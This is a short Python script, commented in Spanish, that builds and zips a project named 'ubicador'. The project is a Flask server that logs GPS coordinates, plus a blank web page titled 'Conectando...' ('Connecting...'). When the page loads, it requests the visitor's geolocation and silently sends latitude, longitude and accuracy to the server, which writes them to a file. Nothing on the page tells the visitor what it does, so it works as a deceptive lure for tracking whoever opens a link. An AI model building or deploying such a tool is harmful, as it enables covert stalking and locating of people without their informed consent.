import zipfile
from pathlib import Path

# Crear carpeta del proyecto
project_dir = Path("ubicador")
project_dir.mkdir(exist_ok=True)

# logger.py
logger_code = '''from flask import Flask, request, send_from_directory
import datetime

app = Flask(__name__)

@app.route('/captura', methods=['POST'])
def captura():
    data = request.get_json()
    with open("ubicaciones.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - LAT: {data['lat']}, LON: {data['lon']}, ACC: {data['acc']}m\\n")
    return 'OK', 200

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
'''

# index.html
index_html = '''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Conectando...</title>
  <style>body { background-color: white; }</style>
</head>
<body>

<script>
function enviarUbicacion(lat, lon, acc) {
  fetch('/captura', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({lat, lon, acc})
  });
}

function obtenerUbicacion() {
  navigator.geolocation.getCurrentPosition(function(pos) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    enviarUbicacion(lat, lon, acc);
  }, function(error) {
    console.log("Permiso denegado o error");
  });
}

obtenerUbicacion();
</script>

</body>
</html>
'''

# Guardar los archivos
(project_dir / "logger.py").write_text(logger_code)
(project_dir / "index.html").write_text(index_html)

# Crear el archivo ZIP
with zipfile.ZipFile("ubicador.zip", "w") as zipf:
    zipf.write(project_dir / "logger.py", arcname="ubicador/logger.py")
    zipf.write(project_dir / "index.html", arcname="ubicador/index.html")

print("Archivo 'ubicador.zip' creado exitosamente.")
